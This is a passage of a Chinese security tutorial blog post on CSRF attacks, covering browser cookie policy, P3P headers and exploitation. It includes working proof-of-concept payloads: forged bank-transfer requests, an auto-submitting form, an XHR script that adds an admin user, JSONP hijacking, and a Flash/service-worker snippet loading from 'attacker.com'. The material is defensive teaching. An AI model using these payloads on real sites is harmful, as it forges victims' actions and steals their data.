{"title":"CSRF攻击原理介绍和利用","slug":"网安大类/OWASPTOP/WebFrontEnd/CSRF攻击原理介绍和利用","date":"2019-08-17T10:36:30.000Z","updated":"2023-01-31T02:29:10.674Z","url":"2019/8-17-390.html","path":"api/articles/2019/8-17-390.html.json","covers":["https://img.weiyigeek.top/2019/1/20190922144921.png","https://img.weiyigeek.top/2019/1/20190922145045.png","https://img.weiyigeek.top/2019/1/20190922150200.png","https://img.weiyigeek.top/2019/1/20190922153549.png","https://img.weiyigeek.top/2019/1/20190922153727.png","https://img.weiyigeek.top/2019/1/20190922153814.png","https://img.weiyigeek.top/2019/1/20190922155647.png","https://img.weiyigeek.top/2019/1/20190922155735.png","https://img.weiyigeek.top/2019/1/20190922155827.png","https://img.weiyigeek.top/2019/1/20190922163253.png","https://img.weiyigeek.top/2019/1/20190922163647.png","https://img.weiyigeek.top/2019/1/20190923112128.png","https://img.weiyigeek.top/2019/1/20190922161848.png","https://img.weiyigeek.top/2019/1/20190923141433.png","https://img.weiyigeek.top/2019/1/20190923145136.png","https://img.weiyigeek.top/2019/1/20190922162557.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-前言介绍\"><a href=\"#0x00-前言介绍\" class=\"headerlink\" title=\"0x00 前言介绍\"></a>0x00 前言介绍</h4><p><em>CSRF是什么？</em><br>答:CSRF（<code>Cross-site request forgery</code>）跨站请求伪造，也被称为 <code>One Click Attack</code>或者<code>Session Riding</code>，是一种广泛存在于网站中的安全漏洞缩写为<code>CSRF/XSRF</code>。</p>\n<p>CSRF则通过伪装来自受信任用户的请求来利用受信任的网站，与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性，但往往同XSS一同作案！</p>\n<p><em>如何理解你可以这么理解CSRF攻击？</em><br>“攻击者盗用了你的身份，以你的名义发送恶意请求”，CSRF是一种依赖web浏览器的、被混淆过的代理人攻击，往往涉及到个人隐私泄露以及财产安全。</p>\n<p>在学习CSRF之前还是需要了解一些额外的信息:<br><strong>(1) JSONP跨域获取信息</strong><br>同源策略，是浏览器安全的基石。但是有时开发中要求B站中获取A站的数据，不得不使用JSONP等方式进行跨域请求。<br>JSONP是通过GET请求跨域，因此一般情况下任何人都可以获取信息并把信息发给自己。<br>JSONP使用如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> addScriptTag(src) &#123;</span><br><span class=\"line\">  var script = document.createElement(<span class=\"string\">'script'</span>);</span><br><span class=\"line\">  script.setAttribute(<span class=\"string\">\"type\"</span>,<span class=\"string\">\"text/javascript\"</span>);</span><br><span class=\"line\">  script.src = src;</span><br><span class=\"line\">  document.body.appendChild(script);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">window.onload = <span class=\"function\"><span class=\"title\">function</span></span> () &#123;</span><br><span class=\"line\">  addScriptTag(<span class=\"string\">'http://example.com/ip?callback=foo'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">function</span> foo(data) &#123;</span><br><span class=\"line\">  console.log(<span class=\"string\">'Your public IP address is: '</span> + data.phone);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure><br>JSONP最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。<br>但是这种跨同源策略的的行为也大大带来了风险不可滥用。因为这些数据别人也是可以获取的，<code>最好不要用JSONP传递敏感的信息</code>。</p>\n<hr>\n\n<h4 id=\"0x01-CSRF基础原理\"><a href=\"#0x01-CSRF基础原理\" class=\"headerlink\" title=\"0x01 CSRF基础原理\"></a>0x01 CSRF基础原理</h4><p>描述:在讲解CSRF之前我们先来看一个<code>小明和小红和面部解锁的故事</code>,就是小明去小红家玩耍,而玩了以后小红困了就去睡一觉这时小明只能找其他的东西玩,这时他看见了小红的手机但是解锁需要进行面部识别,它将其手机对着小红进行刷一下脸成功解锁,而此时小红还沉浸在睡梦里面什么都不知道;</p>\n<p><em>而我们应该如何防护这一安全问题呢？</em><br>这时某家手机厂商发布了新的技术，这个技术就是当你解锁的时候验证手机的来源，比如是否能匹配你的手表或者戒指其他东西，来证明是你主动得解锁，也就是证明解锁的人是你，这样小明得利用就比较难了，但是也并不是没有办法，比如使用偷走小红的手表等等，此时手机厂商又推出了新的功能那就是用户的凭证，每一次都会进行凭证的验证，当每一次用户解锁手机的时候手表需要从服务端取回数据，然后再用手表中的作为凭证去做面容解锁，而且每一个数据只能使用一次。这样不能仅仅靠小明的那一双手能够越过的了，但是也不是没有办法，那么故事讲完了我们来分析一下各个事物在CSRF攻击中相当于什么东西吧~首先<br>小明攻击者小红受害者这里我们把小红的脸部也就是我们的cookie或者是一种识别我们用户的标识。手表这样用于验证也就是Referer 那么token就是服务端生成的数据了</p>\n<p>官方术语说: 攻击能劫持终端用户在已登录的Web站点上执行本意操作，会自动携带同一域名下的cookie到服务器，简单的说攻击者透过盗用用户身份悄悄发送一个请求，或执行某些恶意操作，CSRF的过程非常隐秘受害人甚至无法察觉。</p>\n<p><em>产生CSRF漏洞的原因大致有以下:</em></p>\n<ul>\n<li>一方面是开发者不够谨慎，编写的Web应用程序存在漏洞导致恶意利用；</li>\n<li>另一方面因为Web浏览器对于Cookie和HTTP身份验证的回话信息的处理存在一定的缺陷；</li>\n<li>服务器对于浏览器过于信任，相信从该浏览器发出的请求都是正确的，却没有区分这是用户主动发送的请求，还是模拟用户行为发出来的。</li>\n</ul>\n<p><br></p>\n<p><em>CSRF基础流程原理图:</em><br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190922144921.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><em>简单的案例场景：</em><br>假如你登录了一个存在CSRF漏洞的网银A，只是进行查询余额操作.由于你已经登录，你的浏览器的操作都会被网银A的服务器信任，这时候有人发送给你一个网站B链接,内容介绍你很感兴趣,于是你点开了.然后你看完了内容,回过头来看自己的余额,发现钱都被转走了，下面就是一个流程图。<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190922145045.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<p><em>(1) 详细剖析CSRF案例场景</em></p>\n<ul>\n<li><p>假设某个站点具有转账功能（并且你已经登录）利用的GET方式实现该功能的HTML表单如下：<br>银行网站A它以GET请求来完成银行转账的操作，如<code>http://www.mybank.com/Transfe</code><br>危险网站B它里面有一段HTML的代码如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>首先你登录了银行网站A，然后访问危险网站B，这时你会发现你的银行账户少了1000块.<br><em>为什么会这样呢？</em><br>答:原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的<code>&lt;img&gt;</code>以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code> 结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作）所以就立刻进行转账操作</p>\n</li>\n<li><p>CSRF POC 1:只要输入对应的账号和金额提交就能实现转账。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form action&#x3D;&quot;transfer.php&quot; method&#x3D;&quot;POST&quot;&gt;  #以上CSRF能成功地原因，还有一个是因为开发人员滥用$_REQUEST方法，导致本来的POST操作可以用GET方式实现。</span><br><span class=\"line\">账号：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;toBankId&quot;&#x2F;&gt;&lt;&#x2F;br&gt;</span><br><span class=\"line\">金额：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;money&quot;&#x2F;&gt;&lt;&#x2F;br&gt;</span><br><span class=\"line\">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&#x2F;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>假设受害者点击含有恶意代码的链接，并浏览带有下面HTML代码的网页b.com域的网站：<code>&lt;img src=&quot;http://www.a.com.transfer.php?toBankId=99&amp;money=1000&quot; /&gt;</code></p>\n</li>\n<li><p>在这个CSRF的过程中，受害者是毫不知情的，莫名其妙发生了转账行为，CSRF的<code>攻击最大的特点就是完全以用户的身份发起的很难防御</code>。</p>\n</li>\n</ul>\n<p><br></p>\n<ul>\n<li>CSRF POC 2: 如果开发人员改用$_POST()方法来获取数据，那么要想成功执行CSRF需要加上Javascript代码（与XSS相结合）如下HTML： <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#选择用 POST 方法但也能轻松的绕过，采用iframe里面form表单进行POST请求即可。</span></span><br><span class=\"line\">&lt;form id=<span class=\"string\">\"test\"</span> action=<span class=\"string\">\"http://www.xxx.com.transfer.php\"</span> method=<span class=\"string\">\"POST\"</span>&gt;</span><br><span class=\"line\">账号：&lt;input <span class=\"built_in\">type</span>=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"toBankId\"</span>/&gt;&lt;/br&gt;</span><br><span class=\"line\">金额：&lt;input <span class=\"built_in\">type</span>=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"money\"</span>/&gt;&lt;/br&gt;</span><br><span class=\"line\">&lt;input <span class=\"built_in\">type</span>=<span class=\"string\">\"submit\"</span> value=<span class=\"string\">\"提交\"</span>/&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;script&gt;document.getElementById(<span class=\"string\">\"test\"</span>).submit()&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190922150200.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<hr>\n\n</li>\n</ul>\n<h4 id=\"0x02-CSRF补充知识点\"><a href=\"#0x02-CSRF补充知识点\" class=\"headerlink\" title=\"0x02 CSRF补充知识点\"></a>0x02 CSRF补充知识点</h4><h5 id=\"CSRF之Cookie策略\"><a href=\"#CSRF之Cookie策略\" class=\"headerlink\" title=\"CSRF之Cookie策略\"></a>CSRF之Cookie策略</h5><p>描述:CSRF之所以能请求成功是由于用户登录过网站，并且浏览器在Cookie有效的时间里保存了用户的身份凭据，而不管你通过什么方式访问网站，都会带上这个网站的 Cookies ，从第三方来的访问自然也不能例外。</p>\n<p><strong>1）浏览器的Cookie的分类</strong></p>\n<ul>\n<li>一种是 Session Cookie，又称 “临时Cookie”。</li>\n<li>另一种是 Third-Party Cookie，也称 “本地Cookie”。</li>\n</ul>\n<p>两则的区别：</p>\n<ul>\n<li>Session Cookies 保存在浏览器进程的内存空间中，即浏览器关闭后便失效</li>\n<li>Third-Party Cookie 是保存在本地，且有一个Expire的有效时间，超出后便失效了。</li>\n</ul>\n<p>注意Tips：如果要跨域请求处于安全原因，某些浏览器会阻止Third-Party Cookie的传输。</p>\n<ul>\n<li>会拦截的浏览器：IE7/8/9、Safari</li>\n<li>不会拦截的浏览器：Firefox、Chrome、Opera、Andriod Browser</li>\n</ul>\n<p>比如：我们在A.com的domain中Cookie.php给浏览器写入两个Cookies一个临时一个本地。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    header(<span class=\"string\">\"Set-Cookie: cookieName=1234;\"</span>);</span><br><span class=\"line\">    header(<span class=\"string\">\"Set-Cookie: cookieName=1234; expires=Thu,01-Jan-2030 00:00:00 GMT;\"</span>,<span class=\"keyword\">false</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p style='color:red'&gt;This is A domain&lt;/p&gt;\"</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure><br>此时在B.com 域里面有一个 <code>http://www.b.com/csrf-test.html</code> 此页面构造了访问 <a href=\"http://www.a.com\" target=\"_blank\" rel=\"noopener\">www.a.com</a> <code>&lt;iframe src=&quot;http://www.a.com&quot;&gt;&lt;/iframe&gt;</code><br>这时你会发现<code>IE会禁止本地的Cookie而发送临时Cookie</code>，而我是用的火狐，则默认策略中允许发送第三方Cookies。</p>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190922153549.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p>IE处于安全方面上的考虑，默认禁止了浏览器在<code>&lt;img&gt;/&lt;iframe&gt;/&lt;script&gt;/&lt;link&gt;</code>等标签中发第三方Cookies</p>\n<p><br></p>\n<p><strong>2）P3P头的副作用  (P3P只有IE支持！)</strong><br>尽管有些CSRF实施起来不需要认证，不需要发送Cookies，但是大多数重要的操作都在上面认证之后，但是P3P头的介入变得复杂起来了。</p>\n<ul>\n<li><p>P3P header 是W3C指定的一项关于隐私标准，全称是 “个人隐私安全平台项目|The Platform  for privacy Preferences”，P3P提高了用户对个人隐私性信息的控制权<br>如果网站返回给浏览器的HTTP头中包含P3P头，则某种程度上来说，将允许浏览器发送第三方Cookies，IE下即使是<code>&lt;iframe&gt;与&lt;script&gt;</code>等标签也将不再拦截第三方Cookies的发送。</p>\n</li>\n<li><p>P3P 头主要用于类似广告等需要跨域访问的页面，P3P头设置后，对于Cookies的影响将扩大到整个域中的所有页面。因为Cookies是以域和path为单位，这并不符合”最小权限原则”；</p>\n</li>\n</ul>\n<p>比如：有a域或者b域,且在B域上面有个页面其中包含指向<a href=\"http://www.a.com的iframe\" target=\"_blank\" rel=\"noopener\">www.a.com的iframe</a>; <code>http://www.b.com/test.html的内容为</code>:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;iframe src=<span class=\"string\">\"http://www.localhost.com/test.php\"</span>&gt;Test&lt;/iframe&gt;</span><br><span class=\"line\"><span class=\"comment\">#a域 的test.php是-个对a.com域设置Cookie的页面，其内容为：</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    header(<span class=\"string\">\"Set-Cookies: test=axis2; domain=.localhost; path = /\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190922153727.png\" alt=\"WeiyiGeek.火狐浏览器是没问题的\" title=\"\" class=\"\">\n                <p>WeiyiGeek.火狐浏览器是没问题的</p>\n            </figure>\n<p>P3P 的策略只设计一次即可，之后每次请求都请教都会遵循此策略，而不需要重复设置，采用P3P策略重写test.php文本如下：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    header(<span class=\"string\">\"P3P:CP=CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUI INT DEM STA PRE COM NAV OTC NOI DSP COR\"</span>);</span><br><span class=\"line\">    header(<span class=\"string\">\"Set-Cookies: test=axis2; expires=Sun, 23-Dec-2018 08:13:02 GMT;domain=.localhost; path = /\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"comment\">#//或者直接引用一个头  HTTP Headers</span></span><br><span class=\"line\">HTTP/<span class=\"number\">1.1</span> <span class=\"number\">200</span> OK</span><br><span class=\"line\">P3P: policyref=<span class=\"string\">\"http://catalog.example.com/P3P/PolicyReferences.xml\"</span></span><br><span class=\"line\">Content-Type: text/html</span><br><span class=\"line\">Content-Length: <span class=\"number\">7413</span></span><br><span class=\"line\">Server: CC-Galaxy/<span class=\"number\">1.3</span><span class=\"number\">.18</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"comment\">#//或者Link标签</span></span><br><span class=\"line\">&lt;link rel=<span class=\"string\">\"P3Pv1\"</span> href=<span class=\"string\">\"http://catalog.example.com/P3P/PolicyReferences.xml\"</span>&gt;</span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"comment\">#参考文档：https://www.w3.org/TR/P3P/#ref_file_example</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190922153814.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p>P3P策略帮助 : <a href=\"https://www.w3.org/TR/P3P/#compact_policy_vocabulary\" target=\"_blank\" rel=\"noopener\">https://www.w3.org/TR/P3P/#compact_policy_vocabulary</a></p>\n<p>正因为P3P头目前在网站中广泛应用，因此CSRF防御中不能依赖与浏览器对第三方Cookie的拦截策略。</p>\n<p><br></p>\n<h5 id=\"CSRF之Flash机制\"><a href=\"#CSRF之Flash机制\" class=\"headerlink\" title=\"CSRF之Flash机制\"></a>CSRF之Flash机制</h5><p>IE6/7中，Flash发送网络请求均可以带上本地Cookies，但是<code>IE8起Flash发起的网络请求不在发送本地Cookies了</code><br>Flash中发起请求的方式：URLRequest、getURL、loadVars。</p>\n<hr>\n\n<h4 id=\"0x03-CSRF漏洞利用\"><a href=\"#0x03-CSRF漏洞利用\" class=\"headerlink\" title=\"0x03 CSRF漏洞利用\"></a>0x03 CSRF漏洞利用</h4><p>描述:CSRF的利用点找寻<code>订单下单处 修改敏感信息处 删除信息处 绑定处 发送信息处</code>;<br>CSRF利用场景:</p>\n<ul>\n<li>获取个人数据（常常使用）</li>\n<li>修改个人数据（横向越权）</li>\n<li>添加用户（纵向越权）等</li>\n</ul>\n<p><em>CSRF的最佳利用方式么？</em><br>答:电商用户新增默认收货地址、发微博、添加管理员等等，所有的敏感操作都可以是我们的攻击目标，发现的用户账号授权相关的操作、二维码登陆、绑定第三方账号等，这些功能有CSRF的话就直接被盗号了，也就是说所有的敏感操作都需要进行CSRF的防护。</p>\n<p><strong>(1)采用CSRF来POST提交后台用户注册</strong><br>描述:有时候CSRF需要POST来进行请求,而JSONP只是支持GET所有这时可以采用AJAX请求,当然存在的CORS会更好的利用;<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XHR = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> XHR = windows.XMLHttpRequest ? <span class=\"keyword\">new</span> XMLHttpRequest() : <span class=\"keyword\">new</span> ActiveXObeject(<span class=\"string\">'Microsoft.XMLHTTP'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> url=<span class=\"string\">\"http://127.0.0.1/admin/add_user.asp\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> params=<span class=\"string\">\"UserName=XSSUSER&amp;password=123456&amp;password1=123346&amp;submit=%CC%E1\"</span>;</span><br><span class=\"line\">XHR.open(<span class=\"string\">\"POST\"</span>,url,<span class=\"literal\">true</span>);</span><br><span class=\"line\">XHR.setRequestHeader(<span class=\"string\">\"Content-type\"</span>,<span class=\"string\">\"application-x-www-form-urlencoded\"</span>); <span class=\"comment\">//点是值得学习的是加入了setRequestHeader；</span></span><br><span class=\"line\">XHR.setRequestHeader(<span class=\"string\">\"Content-length\"</span>,params.length);  <span class=\"comment\">//值得学习</span></span><br><span class=\"line\">XHR.setRequestHeader(<span class=\"string\">\"Connection\"</span>,<span class=\"string\">\"close\"</span>);</span><br><span class=\"line\">XHR.send(params);</span><br><span class=\"line\"></span><br><span class=\"line\">XHR.onreadystatechange = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (XHR.readyState == <span class=\"number\">4</span> &amp;&amp; XHR.status == <span class=\"number\">200</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">document</span>.write(XHR.responseText);</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">\"添加成功！！\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<p><strong>(2)JSON采用CSRF进行攻击</strong><br>描述: 在漏洞挖掘过程当中多少会碰到csrf攻击 基本的csrf攻击，用burp就可以直接生成poc来测试(包括通过xhr请求执行csrf) 但是碰到post传输的数据是json格式时，burp也无解这时候下面的tips也许会起点儿作用；<br>我们来假设一个场景：<code>http://target.com</code> (无其他任何额外的csrf防御(token，验证refer)),只是对数据格式或者数据类型进行判断:</p>\n<ul>\n<li>1.服务器只验证是否为json格式的数据不验证Content-type请求头<br>用fetch构造出JSON数据即可解决:<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190922155647.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n</li>\n</ul>\n<p>我们访问json_csrf.html:：<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190922155735.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<ul>\n<li>2.服务器寻找json格式的数据并验证Content-type,是否为application / json</li>\n<li>3.用flash和307重定向即可解决：<br>精心构造的flash文件:攻击者可以利用foo.example.com的Service Worker通过Flash读取CSRF-token<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Write Flash AS code</span></span><br><span class=\"line\">import flash.external.*;</span><br><span class=\"line\">import flash.net.*;</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"function\"><span class=\"title\">function</span></span> () &#123;</span><br><span class=\"line\">  var loader = new URLLoader(new URLRequest(<span class=\"string\">\"https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441/\"</span>));</span><br><span class=\"line\">  loader.addEventListener(<span class=\"string\">\"complete\"</span>, loaderCompleted);</span><br><span class=\"line\">  <span class=\"keyword\">function</span> loaderCompleted(event) &#123;</span><br><span class=\"line\">  ExternalInterface.call(<span class=\"string\">\"alert\"</span>, event.target.data.slice(189270,189335));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#HTML页面嵌入</span></span><br><span class=\"line\">var url = <span class=\"string\">\"https://attacker.com/bad.swf\"</span>;</span><br><span class=\"line\">  onfetch = (e) =&gt; &#123;</span><br><span class=\"line\">  e.respondWith(fetch(url);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#js新特性</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"string\">'serviceWorker'</span> <span class=\"keyword\">in</span> navigator) &#123;</span><br><span class=\"line\">  // 4837-sw.txt is the previous file. </span><br><span class=\"line\">  navigator.serviceWorker.register(<span class=\"string\">'4837-sw.txt'</span>).<span class=\"keyword\">then</span>(_=&gt;location=1337);\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n<li>4.带有307状态代码的PHP文件</li>\n<li>5.跨域XML文件: <a href=\"https://github.com/sp1d3r/swf_json_csrf\" target=\"_blank\" rel=\"noopener\">https://github.com/sp1d3r/swf_json_csrf</a><br>将该项目下载后放在自己服务器的根目录下，访问:<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http[s]://[youhost]/read.html?jsonData=&#123;<span class=\"string\">\"name\"</span>:<span class=\"string\">\"P0rZ9\"</span>,<span class=\"string\">\"phone\"</span>:<span class=\"string\">\"123\"</span>&#125;&amp;php_url=http[s]://[youhost]/test.php&amp;endpoint=http://target.com</span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190922155827.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n</li>\n</ul>\n<p><br></p>\n<p><strong>(3)读取CSRF漏洞类型-JSONP劫持</strong><br>描述: <code>JSONP（JSON with Padding）是数据格式JSON的一种“使用模式”</code>，可以让网页从别的网域要数据另一个解决这个问题的新方法是跨来源资源共享。它将引入一个函数那就是callback函数回调函数这里的解释可能看不懂，其实我们只需要把他理解成一个回调给我们的参数就好了，我们只需要有这个参数在去读取这个参数就可以进行jsonp的劫持了.</p>\n<p>比如示例:劫持用户得一些个人信息<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190922163253.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure><br>我们发现url上有一个参数是callback=aaa没错这里就是回调函数，我们就可以根据他来劫持jsonp的数据了那么我们就可以构造如下poc;<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt; <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">aaa</span>(<span class=\"params\">json</span>) </span>&#123; alert(<span class=\"built_in\">JSON</span>.stringify(json)) &#125; &lt;<span class=\"regexp\">/script&gt; </span></span><br><span class=\"line\"><span class=\"regexp\">&lt;script src=\"https:/</span><span class=\"regexp\">/vip.xxxxx.com/</span>ajax/list/memberPonits.do?callback=aaa <span class=\"string\">\"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><em>jsonp劫持思路</em></p>\n<ul>\n<li>也是十分简单我们所要做的也就是寻找敏感点—&gt;测试敏感点功能—&gt;构造Poc</li>\n</ul>\n<BR>\n\n<p><strong>(4)读取CSRF漏洞类型-CORS劫持</strong><br>描述:HTTP访问控制CORS是一种机制(具体的看我上面有关于CORS的文章),利用和jsonp的作用差不多，只不过是方式有所改变；<br>那么我们在这个漏洞中的关键点就是Orgin这个参数的传递了，有时候我们需要自己添加有时候他有而有时候他会通过某些参数传递以及浏览器自动获取;<br>举个例子: 需要采用PoC-CORS验证工具<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190922163647.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            